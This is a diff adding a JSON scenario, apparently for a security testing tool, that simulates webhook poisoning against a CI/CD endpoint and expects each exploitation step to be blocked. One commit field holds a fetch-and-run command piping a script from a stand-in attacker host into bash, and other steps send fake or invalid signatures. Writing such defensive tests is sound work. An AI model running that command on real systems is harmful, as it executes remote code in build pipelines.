@@ -1,0 +1,88 @@
+{
+  "id": "supply-chain-webhook-poisoning",
+  "name": "CI/CD Webhook Poisoning Attack",
+  "category": "Supply Chain",
+  "difficulty": "Advanced",
+  "description": "Simulates a malicious payload sent to a CI/CD webhook endpoint to execute unauthorized commands in the build pipeline.",
+  "steps": [
+    {
+      "id": "webhook-recon",
+      "name": "Webhook Endpoint Reconnaissance",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/webhooks/github",
+        "headers": {
+          "X-GitHub-Event": "ping",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "zen": "Reactivity is a good thing."
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "malicious-webhook-payload",
+      "name": "Poisoned Webhook Payload",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/webhooks/github",
+        "headers": {
+          "X-GitHub-Event": "push",
+          "X-Hub-Signature-256": "sha256=fake-signature-value",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "ref": "refs/heads/main",
+          "repository": {
+            "full_name": "owner/repo",
+            "url": "https://github.com/owner/repo"
+          },
+          "commits": [
+            {
+              "message": "Update build.sh",
+              "modified": ["build.sh"],
+              "content": "curl -s https://attacker.com/malicious.sh | bash"
+            }
+          ]
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "webhook-recon"
+      ]
+    },
+    {
+      "id": "webhook-signature-bypass",
+      "name": "Webhook Signature Bypass Attempt",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/webhooks/github",
+        "headers": {
+          "X-GitHub-Event": "push",
+          "X-Hub-Signature-256": "invalid-signature",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "ref": "refs/heads/main"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      }
+    }
+  ]
+}
